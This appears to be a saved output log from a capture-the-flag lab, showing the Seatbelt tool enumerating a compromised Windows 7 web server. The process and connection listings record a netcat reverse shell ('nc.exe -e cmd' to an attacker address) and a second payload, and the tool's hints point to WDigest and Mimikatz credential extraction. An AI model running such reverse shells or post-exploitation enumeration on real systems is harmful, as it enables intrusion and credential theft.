@@ -1,0 +1,520 @@
+C:\Windows\Temp\temp>SeatbeltNet3.5AnyCPU.exe all > output_seatbelt.txt
+SeatbeltNet3.5AnyCPU.exe all > output_seatbelt.txt
+
+C:\Windows\Temp\temp>type output_seatbelt.txt
+type output_seatbelt.txt
+
+
+                        %&&@@@&&                                                                                  
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################                        
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
+                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,                                                                                 
+
+
+
+=== Running System Triage Checks ===
+
+
+
+=== Basic OS Information ===
+
+  Hostname                      :  devel
+  Domain Name                   :  
+  Username                      :  IIS APPPOOL\Web
+  ProductName                   :  Windows 7 Enterprise
+  EditionID                     :  Enterprise
+  ReleaseId                     :  
+  BuildBranch                   :  
+  CurrentMajorVersionNumber     :  
+  CurrentVersion                :  6.1
+  Architecture                  :  x86
+  ProcessorCount                :  1
+  IsVirtualMachine              :  True
+  BootTime (approx)             :  21/7/2020 2:48:45 ��
+  HighIntegrity                 :  False
+  IsLocalAdmin                  :  False
+
+
+=== Reboot Schedule (event ID 12/13 from last 15 days) ===
+
+  20/7/2020 8:56:27 ��    :  startup
+  21/7/2020 3:42:32 ��    :  startup
+  21/7/2020 6:25:36 ��    :  startup
+  21/7/2020 6:34:01 ��    :  shutdown
+
+  21/7/2020 6:34:06 ��    :  startup
+
+
+=== Current Privileges ===
+
+                SeAssignPrimaryTokenPrivilege:  DISABLED
+                     SeIncreaseQuotaPrivilege:  DISABLED
+                          SeShutdownPrivilege:  DISABLED
+                             SeAuditPrivilege:  DISABLED
+                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                            SeUndockPrivilege:  DISABLED
+                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                SeIncreaseWorkingSetPrivilege:  DISABLED
+                          SeTimeZonePrivilege:  DISABLED
+
+
+=== UAC System Policies ===
+
+  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
+  EnableLUA                      : 1
+  LocalAccountTokenFilterPolicy  : 
+  FilterAdministratorToken       : 0
+    [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+    [*] Only the RID-500 local admin account can be used for lateral movement.
+
+
+=== PowerShell Settings ===
+
+  PowerShell v2 Version          : 2.0
+  PowerShell v5 Version          : 
+
+  Transcription Settings:
+
+  Module Logging Settings:
+
+  Scriptblock Logging Settings:
+
+
+
+=== Audit Settings ===
+
+
+
+=== WEF Settings ===
+
+
+
+=== LSA Settings ===
+
+  auditbaseobjects               : 0
+  auditbasedirectories           : 0
+  crashonauditfail               : 0
+  fullprivilegeauditing          : System.Byte[]
+  Bounds                         : System.Byte[]
+  LimitBlankPasswordUse          : 1
+  NoLmHash                       : 1
+  Notification Packages          : scecli
+  Security Packages              : kerberos,msv1_0,schannel,wdigest,tspkg,pku2u
+    [*] Wdigest is enabled- plaintext password extraction is possible!
+  Authentication Packages        : msv1_0
+  LsaPid                         : 504
+  SecureBoot                     : 1
+  ProductType                    : 4
+  disabledomaincreds             : 0
+  everyoneincludesanonymous      : 0
+  forceguest                     : 0
+  restrictanonymous              : 0
+  restrictanonymoussam           : 1
+
+
+=== User Environment Variables ===
+
+  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
+  TEMP                                : C:\Windows\TEMP
+  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+  PSModulePath                        : C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+  USERDOMAIN                          : HTB
+  PROCESSOR_ARCHITECTURE              : x86
+  SystemDrive                         : C:
+  APPDATA                             : C:\Windows\system32\config\systemprofile\AppData\Roaming
+  windir                              : C:\Windows
+  LOCALAPPDATA                        : C:\Windows\system32\config\systemprofile\AppData\Local
+  APP_POOL_CONFIG                     : C:\inetpub\temp\apppools\Web.config
+  TMP                                 : C:\Windows\TEMP
+  USERPROFILE                         : C:\Windows\system32\config\systemprofile
+  ProgramFiles                        : C:\Program Files
+  FP_NO_HOST_CHECK                    : NO
+  COMPUTERNAME                        : DEVEL
+  APP_POOL_ID                         : Web
+  USERNAME                            : DEVEL$
+  NUMBER_OF_PROCESSORS                : 1
+  PROCESSOR_IDENTIFIER                : x86 Family 6 Model 63 Stepping 2, GenuineIntel
+  SystemRoot                          : C:\Windows
+  ComSpec                             : C:\Windows\system32\cmd.exe
+  CommonProgramFiles                  : C:\Program Files\Common Files
+  PROMPT                              : $P$G
+  PROCESSOR_LEVEL                     : 6
+  PROCESSOR_REVISION                  : 3f02
+  expl                                : yes
+  ALLUSERSPROFILE                     : C:\ProgramData
+  long                                : no
+  ProgramData                         : C:\ProgramData
+  OS                                  : Windows_NT
+  PUBLIC                              : C:\Users\Public
+
+
+=== System Environment Variables ===
+
+  ComSpec                             : C:\Windows\system32\cmd.exe
+  FP_NO_HOST_CHECK                    : NO
+  OS                                  : Windows_NT
+  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+  PROCESSOR_ARCHITECTURE              : x86
+  TEMP                                : C:\Windows\TEMP
+  TMP                                 : C:\Windows\TEMP
+  USERNAME                            : SYSTEM
+  windir                              : C:\Windows
+  PSModulePath                        : C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+  NUMBER_OF_PROCESSORS                : 1
+  PROCESSOR_LEVEL                     : 6
+  PROCESSOR_IDENTIFIER                : x86 Family 6 Model 63 Stepping 2, GenuineIntel
+  PROCESSOR_REVISION                  : 3f02
+
+
+=== User Folders ===
+
+  Folder                                Last Modified Time
+  C:\Users\Administrator              : 18/3/2017 1:16:53 ��
+  C:\Users\babis                      : 17/3/2017 4:17:52 ��
+  C:\Users\Classic .NET AppPool       : 18/3/2017 1:06:26 ��
+
+
+=== Non Microsoft Services (via WMI) ===
+
+  Name             : VGAuthService
+  DisplayName      : VMware Alias Manager and Ticket Service
+  Company Name     : VMware, Inc.
+  Description      : Alias Manager and Ticket Service
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+  IsDotNet         : False
+
+  Name             : VMTools
+  DisplayName      : VMware Tools
+  Company Name     : VMware, Inc.
+  Description      : Provides support for synchronizing objects between the host and guest operating systems.
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+  IsDotNet         : False
+
+
+
+=== HKCU Internet Settings ===
+
+                 EnableNegotiate : 1
+                      User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+              IE5_UA_Backup_Flag : 5.0
+            ZonesSecurityUpgrade : System.Byte[]
+
+
+=== HKLM Internet Settings ===
+
+                  EnablePunycode : 1
+              CodeBaseSearchPath : CODEBASE
+                  WarnOnIntranet : 1
+                    MinorVersion : 0
+                    ActiveXCache : C:\Windows\Downloaded Program Files
+
+
+=== LAPS Settings ===
+
+  [*] LAPS not installed
+
+
+=== Local Group Memberships ===
+
+  * Administrators *
+
+    DEVEL\Administrator
+
+  * Remote Desktop Users *
+
+
+  * Distributed COM Users *
+
+
+  [X] Cannot find SID translation for 'S-1-5-32-580'
+
+
+=== Drive Information (via .NET) ===
+
+  Drive        Mapped Location
+  A:\        : A:\
+  C:\        : C:\
+  D:\        : D:\
+
+
+=== Current Host RDP Sessions (qwinsta) ===
+
+
+
+=== Mapped Drives (via WMI) ===
+
+
+
+=== Network Shares (via WMI) ===
+
+  Name             : ADMIN$
+  Path             : 
+  Description      : Remote Admin
+
+  Name             : C$
+  Path             : 
+  Description      : Default share
+
+  Name             : IPC$
+  Path             : 
+  Description      : Remote IPC
+
+
+
+=== Firewall Rules (Deny) ===
+
+  Current Profile(s)          : PUBLIC
+
+  FirewallEnabled (Domain)    : True
+  FirewallEnabled (Private)   : True
+  FirewallEnabled (Public)    : True
+
+
+
+=== Registered Antivirus (via WMI) ===
+
+
+
+=== Process Enumerations ===
+
+  * Potential Defensive Processes *
+
+
+  * Browser Processes *
+
+
+  * Other Interesting Processes *
+
+	Name         : cmd.exe
+	Product      : Command Prompt
+	ProcessID    : 2256
+	Owner        : IIS APPPOOL\Web
+	CommandLine  : "cmd.exe" /c C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.62 443
+
+	Name         : cmd.exe
+	Product      : Command Prompt
+	ProcessID    : 2156
+	Owner        : IIS APPPOOL\Web
+	CommandLine  : cmd
+
+	Name         : cmd.exe
+	Product      : Command Prompt
+	ProcessID    : 320
+	Owner        : IIS APPPOOL\Web
+	CommandLine  : cmd
+
+
+
+=== Registry Auto-logon Settings ===
+
+  DefaultUserName         : babis
+
+
+=== Registry Autoruns ===
+
+  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
+    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+
+  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce :
+    C:\Windows\SYSTEM32\WerFault.exe -k -rq
+
+
+=== DNS Cache (via WMI) ===
+
+  [X] 'MSFT_DNSClientCache' WMI class unavailable (minimum supported versions of Windows: 8/2012)
+
+
+=== Current ARP Table ===
+
+
+  Interface     : n/a --- Index 1
+    Internet Address      Physical Address      Type
+    224.0.0.22            00-00-00-00-00-00     Static
+    239.255.255.250       00-00-00-00-00-00     Static
+
+
+  Interface     : Local Area Connection (10.10.10.5) --- Index 11
+    DNS Servers : 10.10.10.2, 8.8.8.8
+
+    Internet Address      Physical Address      Type
+    10.10.10.2            00-50-56-B9-90-78     Dynamic
+    10.10.10.255          FF-FF-FF-FF-FF-FF     Static
+    224.0.0.22            01-00-5E-00-00-16     Static
+    224.0.0.252           01-00-5E-00-00-FC     Static
+
+
+=== Active TCP Network Connections ===
+
+  Local Address          Foreign Address        State      PID   Service         ProcessName
+  0.0.0.0:21             0.0.0.0:0              LISTEN     1432  ftpsvc          svchost.exe
+  0.0.0.0:80             0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:135            0.0.0.0:0              LISTEN     688   RpcSs           svchost.exe
+  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:5357           0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:49152          0.0.0.0:0              LISTEN     396                   wininit.exe
+  0.0.0.0:49153          0.0.0.0:0              LISTEN     736   eventlog        svchost.exe
+  0.0.0.0:49154          0.0.0.0:0              LISTEN     896   Schedule        svchost.exe
+  0.0.0.0:49155          0.0.0.0:0              LISTEN     496                   services.exe
+  0.0.0.0:49156          0.0.0.0:0              LISTEN     504                   lsass.exe
+  10.10.10.5:80          10.10.14.62:55706      ESTAB      4                     System
+  10.10.10.5:139         0.0.0.0:0              LISTEN     4                     System
+  10.10.10.5:49175       10.10.14.62:443        ESTAB      3192                  C:\inetpub\wwwroot\nc.exe  -e cmd 10.10.14.62 443
+  10.10.10.5:49184       10.10.14.62:53         ESTAB      3800                  C:\Windows\TEMP\shell53.exe 
+
+
+=== Active UDP Network Connections ===
+
+  Local Address          PID    Service                 ProcessName
+  0.0.0.0:3702           1384   FDResPub                svchost.exe
+  0.0.0.0:3702           1384   FDResPub                svchost.exe
+  0.0.0.0:5355           1080   Dnscache                svchost.exe
+  0.0.0.0:59360          1080   Dnscache                svchost.exe
+  0.0.0.0:60753          1384   FDResPub                svchost.exe
+  10.10.10.5:137         4                              System
+  10.10.10.5:138         4                              System
+
+
+=== Non Microsoft Processes (via WMI) ===
+
+  Name           : shell53
+  Company Name   : Apache Software Foundation
+  PID            : 3800
+  Path           : C:\Windows\TEMP\shell53.exe
+  CommandLine    : C:\Windows\TEMP\shell53.exe 
+  IsDotNet       : False
+
+  Name           : SeatbeltNet3.5AnyCPU
+  Company Name   : 
+  PID            : 3572
+  Path           : C:\Windows\Temp\temp\SeatbeltNet3.5AnyCPU.exe
+  CommandLine    : SeatbeltNet3.5AnyCPU.exe  all 
+  IsDotNet       : True
+
+  Name           : nc
+  Company Name   : 
+  PID            : 3192
+  Path           : C:\inetpub\wwwroot\nc.exe
+  CommandLine    : C:\inetpub\wwwroot\nc.exe  -e cmd 10.10.14.62 443
+  IsDotNet       : False
+
+
+
+=== Kerberos Tickets (Current User) ===
+
+  [*] Returned 0 tickets
+
+
+=== Running User Triage Checks ===
+
+
+ [*] In medium integrity, attempting triage of current user.
+
+     Current user : IIS APPPOOL\Web - S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550 
+
+
+=== Checking for Firefox (Current User) ===
+
+
+
+=== Checking for Chrome (Current User) ===
+
+
+
+=== Internet Explorer (Current User) Last 7 Days ===
+
+  History:
+
+  Favorites:
+  [X] Exception: System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\Windows\system32\config\systemprofile\Favorites'.
+   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+   at System.IO.Directory.InternalGetFileDirectoryNames(String path, String userPathOriginal, String searchPattern, Boolean includeFiles, Boolean includeDirs, SearchOption searchOption)
+   at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)
+   at Seatbelt.Program.TriageIE()
+
+
+=== Checking Windows Vaults ===
+  [ERROR] Unable to enumerate vaults. Error (0x1061)
+
+
+=== Saved RDP Connection Information (Current User) ===
+
+
+=== Recent Typed RUN Commands (Current User) ===
+
+
+
+=== Putty Saved Session Information (Current User) ===
+
+
+
+=== Putty SSH Host Key Recent Hosts (Current User) ===
+
+
+
+=== Checking for Cloud Credentials (Current User) ===
+
+
+
+=== Recently Accessed Files (Current User) Last 7 Days ===
+
+  [X] Exception: Could not find a part of the path 'C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Recent'.
+
+
+=== Checking for DPAPI Master Keys (Current User) ===
+
+  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/rpc) to decrypt
+
+
+=== Checking for Credential Files (Current User) ===
+
+
+
+=== Checking for RDCMan Settings Files (Current User) ===
+
+
+
+=== Internet Explorer Open Tabs ===
+
+  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException (0x8000401A): The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)
+   --- End of inner exception stack trace ---
+   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
+   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
+   at System.Type.InvokeMember(String name, BindingFlags invokeAttr, Binder binder, Object target, Object[] args)
+   at Seatbelt.Program.ListIETabs()
+
+
+=== Installed Patches (via WMI) ===
+
+  HotFixID   InstalledOn    Description
+
+
+=== Chrome (Current User) ===
+
+
+=== Firefox (Current User) ===
+
+
+=== Recycle Bin Files Within the last 30 Days ===
+
+
+
+=== Interesting Files (Current User) ===
+
+
+
+[*] Completed All Safety Checks in 1 seconds
